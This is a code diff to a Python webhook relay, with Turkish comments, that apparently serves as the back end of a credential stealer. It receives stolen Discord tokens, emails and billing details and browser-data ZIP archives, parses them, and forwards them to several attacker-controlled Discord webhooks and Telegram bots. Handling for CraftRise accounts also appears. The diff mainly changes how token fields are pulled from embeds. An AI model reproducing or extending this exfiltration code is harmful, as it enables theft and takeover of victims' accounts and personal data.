@@ -45,7 +45,6 @@ def send_discord_with_file(url, content, file_path):
         print(f"[+] ZIP dosyası Discord'a gönderildi: {file_path}")
     except Exception as e:
         print(f"Discord dosya gönderme hatası: {e}")
-        # Fallback: embed gönder
         send_discord_embed(url, {"content": content})
 
 def send_telegram_clean(token, chat_id, msg):
@@ -53,14 +52,12 @@ def send_telegram_clean(token, chat_id, msg):
     if token and chat_id and msg:
         try:
             # Markdown ve kod işaretlerini temizle
-            msg = re.sub(r'\*', '', msg)  # * işaretlerini kaldır
-            msg = re.sub(r'`', '', msg)   # ` işaretlerini kaldır
-            msg = re.sub(r'```\w*\n?', '', msg)  # ```bloklarını kaldır
-            msg = re.sub(r'\n```', '', msg)      # kapanış ``` kaldır
-            msg = re.sub(r'\[([^\]]+)\]\([^\)]+\)', r'\1', msg)  # linkleri sadece yazıya çevir
-            msg = re.sub(r'_', '', msg)  # alt çizgileri kaldır
-            
-            # Fazla boşlukları temizle
+            msg = re.sub(r'\*', '', msg)
+            msg = re.sub(r'`', '', msg)
+            msg = re.sub(r'```\w*\n?', '', msg)
+            msg = re.sub(r'\n```', '', msg)
+            msg = re.sub(r'\[([^\]]+)\]\([^\)]+\)', r'\1', msg)
+            msg = re.sub(r'_', '', msg)
             msg = re.sub(r'\n\s*\n', '\n\n', msg)
             
             if len(msg) > 4000:
@@ -83,18 +80,6 @@ def extract_craftrise_account(content):
                 return match.group(1)
     return content
 
-def extract_discord_info(content):
-    user_match = re.search(r'\*\*User:\*\* `([^`]+)`', content)
-    token_match = re.search(r'\*\*Token:\*\* `([^`]+)`', content)
-    email_match = re.search(r'\*\*Email:\*\* `([^`]+)`', content)
-    billing_match = re.search(r'\*\*Billing:\*\* `([^`]+)`', content)
-    return {
-        "user": user_match.group(1) if user_match else "Unknown",
-        "token": token_match.group(1) if token_match else "Unknown",
-        "email": email_match.group(1) if email_match else "Unknown",
-        "billing": billing_match.group(1) if billing_match else "None"
-    }
-
 def embed_to_telegram_clean(embed):
     """Discord embed'ini Telegram uyumlu TEMIZ metne çevir (işaretsiz)"""
     text = ""
@@ -108,7 +93,6 @@ def embed_to_telegram_clean(embed):
     for field in fields:
         name = field.get("name", "")
         value = field.get("value", "")
-        # Tüm işaretleri temizle
         name = re.sub(r'<[^>]+>', '', name)
         name = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', name)
         name = re.sub(r'[*`_]', '', name)
@@ -144,26 +128,38 @@ def webhook():
             payload = data.get("data", data)
             send_discord_embed(DISCORD_WEBHOOK, payload)
             
-            content = payload.get("content", "")
-            info = extract_discord_info(content)
-            tg_msg = f"Discord Token!\n\nUser: {info['user']}\nToken: {info['token'][:40]}...\nEmail: {info['email']}"
-            send_telegram_clean(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
+            # Telegram için token bilgilerini embed'den çek (content değil!)
+            embeds = payload.get("embeds", [])
+            if embeds:
+                fields = embeds[0].get("fields", [])
+                user = ""
+                token = ""
+                email = ""
+                for field in fields:
+                    name = field.get("name", "")
+                    value = field.get("value", "")
+                    if "User" in name:
+                        user = re.sub(r'[`]', '', value)
+                    elif "Token" in name:
+                        token = value.replace('```fix\n', '').replace('\n```', '').replace('`', '')
+                        token = token[:40] + "..." if len(token) > 40 else token
+                    elif "Email" in name:
+                        email = re.sub(r'[`]', '', value)
+                tg_msg = f"Discord Token!\n\nUser: {user}\nToken: {token}\nEmail: {email}"
+                send_telegram_clean(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
         
         # ============ BROWSER / MASTER ============
         else:
             payload = data.get("data", data)
-            
-            # ZIP dosyasının yolunu payload'dan al (varsa)
             zip_path = payload.get("zip_path", last_zip_path)
             
-            # 1. MASTER_WEBHOOK'a DOSYA OLARAK gönder
             content_text = payload.get("content", "")
             if zip_path and os.path.exists(zip_path):
                 send_discord_with_file(MASTER_WEBHOOK, content_text, zip_path)
             else:
                 send_discord_embed(MASTER_WEBHOOK, payload)
             
-            # 2. Telegram için temiz metin oluştur
+            # Telegram için temiz metin oluştur
             tg_msg = ""
             
             content = payload.get("content", "")
@@ -178,19 +174,15 @@ def webhook():
                 tg_msg += embed_to_telegram_clean(embed)
                 tg_msg += "\n"
             
-            # Download linki varsa ekle (işaretsiz)
-            download_url = None
+            # Download linki varsa ekle
             for embed in embeds:
                 if embed.get("url") and embed.get("url") != "#":
-                    download_url = embed.get("url")
+                    tg_msg += f"\nDownload Link: {embed['url']}\n"
                     break
-            
-            if download_url:
-                tg_msg += f"\nDownload Link: {download_url}\n"
             
             send_telegram_clean(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
             
-            # 3. GLOBAL WEBHOOK'a da DOSYA OLARAK gönder
+            # GLOBAL WEBHOOK'a da DOSYA OLARAK gönder
             if zip_path and os.path.exists(zip_path):
                 send_discord_with_file(WEBHOOK, content_text, zip_path)
             else:
@@ -199,7 +191,6 @@ def webhook():
             # Global Telegram'a da gönder
             send_telegram_clean(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg.strip())
             
-            # ZIP yolunu sakla
             if zip_path:
                 last_zip_path = zip_path
         
